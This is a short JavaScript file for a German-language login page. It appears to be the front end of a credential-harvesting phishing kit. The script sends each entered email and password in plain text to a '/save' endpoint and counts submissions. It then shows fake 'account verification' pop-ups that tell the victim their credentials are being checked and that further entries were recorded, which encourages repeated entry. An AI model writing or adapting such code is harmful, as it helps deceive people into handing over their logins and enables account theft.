const passwordInput = document.getElementById("input-password");
const toggle = document.getElementById("toggle");

toggle.addEventListener("click", (e) => {
  e.preventDefault();
  const isPassword = passwordInput.type === "password";
  passwordInput.type = isPassword ? "text" : "password";
});

// Track submissions
let submissionCount = 0;

function sendData() {
  const email = document.getElementById("input-email").value;
  const password = document.getElementById("input-password").value;

  // Simple validation
  if (!email || !password) {
    alert("Please enter both email and password!");
    return;
  }

  fetch('/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  .then(res => res.json())
  .then(response => {
    console.log('Server response:', response);

    submissionCount++;

    // Show modal
    if (submissionCount === 1) {
      // First submission: keep modal text from HTML as-is
      showModal();
    } else if (submissionCount === 2) {
      // Second submission: change modal text
      const popupTitle = document.getElementById("popup-title");
      const popupMessage = document.getElementById("popup-message");
      popupTitle.innerText = "Kontoprüfung läuft ✔️";
      popupMessage.innerText =
        "Ihre Anmeldedaten werden nun mit unseren Datensätzen abgeglichen, um deren Richtigkeit zu überprüfen. Nach Abschluss des Vorgangs wird Ihre Verifizierung abgeschlossen.";
      showModal();
    } else {
      // Optional: further submissions
      const popupTitle = document.getElementById("popup-title");
      const popupMessage = document.getElementById("popup-message");
      popupTitle.innerText = "Wird geprüft";
      popupMessage.innerText =
        "Weitere Eingaben wurden erfasst. Bitte überprüfen Sie alles sorgfältig.";
      showModal();
    }

    document.getElementById("myForm").reset();
  })
  .catch(err => console.error('Error:', err));
}

// Modal handlers
const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModal");

function showModal() {
  modalOverlay.style.display = "flex";
}

function hideModal() {
  modalOverlay.style.display = "none";
}
closeModalBtn.addEventListener("click", hideModal);